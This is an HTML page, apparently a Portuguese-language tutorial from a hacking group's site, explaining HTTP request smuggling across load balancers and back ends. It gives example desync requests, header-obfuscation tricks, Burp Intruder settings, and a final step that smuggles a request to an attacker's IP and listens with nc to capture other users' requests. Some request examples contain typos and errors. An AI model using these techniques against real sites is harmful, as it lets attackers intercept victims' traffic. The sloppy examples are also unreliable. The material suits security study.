<!DOCTYPE html>
<html lang="pt">
    <style>
    .ascii {
        color: black;
        padding: 30px;
        text-align: center;
        background-image: url('../../asciiart.png');
        background-repeat: no-repeat;
        background-position: center;
        background-color: black;
    }

    .nav {
        overflow: hidden;
        background-color: rgb(5, 5, 5);
    }
    
    .nav a {
        float: left;
        display: block;
        color: white;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        font-family: monospace;
    }
    
    .nav a:hover {
        background-color: rgb(160, 13, 197);
        color: white;
    }

    .card {
    color: #000;
    background-color: #aaa;
    padding: 20px;
    margin-top: 20px;
    }
    </style>
    <title>Paper: HTTP Request Smuggling - Amolo Hunters</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=1024">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <body style="background-color:black;">
        <div class="nav">
            <a href="../../index.html">Home</a>
            <a href="../../papers/">Papers</a>
            <a href="../../hacktivism/">Hacktivismo</a>
            <a href="../../members/">Membros</a>
        </div>
        <div class="ascii">
            <h1 style="color:black;" align="right">.</h1>
            <h1 style="color:black;" align="right">.</h1>
        </div>
        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">HTTP Request Smuggling</h1>
        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Autor: @sniss</p>
        <div>
                <pre style="color:white;">    ((((( Introdução )))))


    - Está vulnerabilidade ocorre com sites que usam um load balancer ou reverse proxy
    
    
    
    - Load balancer distribui as cargas  de processamento de um site em varios servidores
    
    
    - Um servidor proxy reverso é um tipo de servidor proxy que normalmente fica atrás do firewall em uma rede privada 
    e direciona as solicitações do cliente para o servidor de back-end apropriado. 
    Eles também podem executar tarefas adicionais, como criptografia SSL, 
    para aliviar a carga de seus servidores da Web, aumentando assim seu desempenho. 
    
    
    
    ((( Como funciona a conexão entre o  LB e os outros servidores)))
    
    
    USER ----> google.com
                        |
                        -----> LB ----------------------> webapp01 (Servidor de Back-End)
                                        TCP/TLS
                                    HTTP Connection Reuse
                                    ou keep-alive
    
    
    
        - O HTTP Connection Reuse ou keep-alive  é utilizado  para não ficar toda hora que precisar de um pacote ficar
        abrindo novas conexões , assim melhorando o desempenho da aplicação  ou seja ele mantém a conexão entre o usuario eo
        load balancer eo lb eo back end aberto, 
        
    
    
    
                            ((((( Desync  Com CL.CL)))))
    
        
        - Em alguns casos quando o LB controla o Connection Reuse eo keep-alive, ele pode 
        aproveitar a mesma requisição para usuários diferentes ou seja em mesmas requisições processar o pedido dos dois usuários:
    
    
        User1----->            Req:User2    Req: User1
                        LB ------------------------------------>  Back-End
        User2----->              TCP/TLS
                                HTTP Connection Reuse
                                keep-alive
    
    
    
    - Existe um problema quando isso acontece quando o LB mantém a conexão aberta para usuários diferentes o problema é se O
    usuário enviar um conteúdo a mais do que ele precisa, esse conteúdo a mais iria fazer parte da requisição do outro usuário,esse 
    ataque chamamos de desync porque conseguimos dessincronizar o LB e o back-end
    
    
    
                            EX DESYNC:
    
    LB:                                                            Back-End:
    
    POST /home HTTP/1.1                                       POST /home HTTP/1.1 
    Host: localhost                                           Host: localhost
    Content-Length: 55(lb)                                    Content-Length: 55(lb)
    Content-Length: 13(back-end (só  conta nome=carlos))      Content-Length: 13(back-end)
    Content-Type: application/-www-form-urlencoded            Content-Type: application/-www-form-urlencoded
    
    
    nome=carlos                                               nome=carlos
                                                                    
    GET /admin HTTP/1.1                                      --------------Interpreta como outra request---------------
    HOST:localhost                                                
                                                                            GET /admin HTTP/1.1
                                                                            HOST:localhost
    
    
    
    OBS:(A cada final de linha existe 2 caracteres invisíveis o \t e o \n)
    
    
    - Este tipo de Desync não é muito comum atualmente pois a maioria dos sistemas ignoram dois headers repetidos
    
    
    
    
                                ((((((((Desync CL.TE )))))))))
    
    
    
    - Se uma requisição receber Transfer-Encoding e Content-Length, no back-end ele tem que ignorar o Content-Length
    e priorizar o Transfer-Encoding, o front-end vai usar o Content-Length  e ignorar o Transfer-Encodig 
    
    
                                EX:
    LB:
                    
    POST /home HTTP/1.1                                       POST /home HTTP/1.1 
    Host: localhost                                           Host: localhost
    Content-Length: 6(lb)                                    Content-Length: 6(lb)
    Transfer-Encoding: chunked (ignorado)                     Transfer-Encoding: chunked (ele implemento a regra ou seja o 
                                                                Content-Length foi ignorado pelo back-end)
                
    
    0                                                            0
    
    
    T                                                           --------- Outra request ------------  
                                                                    T
    
    
    - o chunked serve para enviar as requisições divididas
    
    
    - 0 indica que a solicitação terminou, usamos isso quando estivermos usando o Transfer-Encoding
    
    
    
    
                                  (((((((( Desync TE.TE )))))))
                                  
    
    
    - Nesse outro cenário ambos suportam o Transfer-Encoding
    
    - Podemos fazer o LB ignorar o  Transfer-Encoding para passar para o back-end, esses cenários são:
        
            colocar um espaço antes do Transfer-Encoding,
            
            colocar um caractere especial(/t) substituindo o espaço entre o ":" e o chunked para fazer isso selecione o espaço
            e aperte tab
            
            colocar um /t invertido em hexadecimal, para fazer isso vamos para o repeater aperte na opção hex e procure o espaço,
            e troque o hex do espaço por 0b
            
    
    - Isso serve para conseguirmos bypassar validações feitas em alguns dos lados, assim fazendo só um lado ler o Transfer-Encoding efetuando o bypass  
    
    
                                  
                                  
                                  ((((((( Desync TE.CL )))))))
                                  
                             
    - Aqui, o Transfer-Encoding é lido pelo front-end eo Content-Length pelo  back-end
    
    
    LB:
    
    POST /sniss  HTTP /1.1                               POST /sniss  HTTP /1.1
    Host: vuln.com                                       Host: vuln.com  
    Transfer-Encoding: chunked (lido pelo front)         Tranfer-Encoding: chunked (ignorado)
    Content-Length: 7 (ignorado)                         Content-Length: 7 (lido pelo back-end)
    
   
    5                                                    5
    ----- Outra req -----                                ---- Outra req ----
    SNISS                                                SNISS
    0                                                    0
    
    
    
    - 5 é o tamanho da nova requisição ou seja a "SNISS" , temos  que botar o tamanho da nova requisição em hexadecimal
    
    
    OBS(Você precisa incluir a sequência final \r\n\r\n seguindo a final 0)
    
    
    
    
        
    OBS:(Se o ataque não estiver funcionando mande-o para o intruder, aperte no clean, na opção Payloads sete como Null Payloads
    e marque a opção Continue Indefinitely, na opção Options desmarque o Update Content-Length e o Connection Close)
    
    
                                (((( Exploração  Http Smuggling + Host Header Injection))))
                        
    - depois de encontrada a vulnerabilidade vamos tentar manipular a requisição da vítima
    
    - Vamos enviar em vez do T uma requisição:
    
                    0
    
                GET / HTTP/1.1
                HOST:seuip/
                X-test:
    
    - Ou seja podemos manipular onde o usuário vai fazer a requisição e o'que ele vai requisitar
    
    - A '/' serve para o back-end ignorar o 2 host header
    
    
    - Para conseguirmos ver uma requisição de um usuário vamos subir um nc no nosso ip e rodar o intruder com nosso exploit
    
    
    - Agora conseguirmos ver as requisições dos usuários                    
                </pre>                    
        </div>
    </body>
</html>
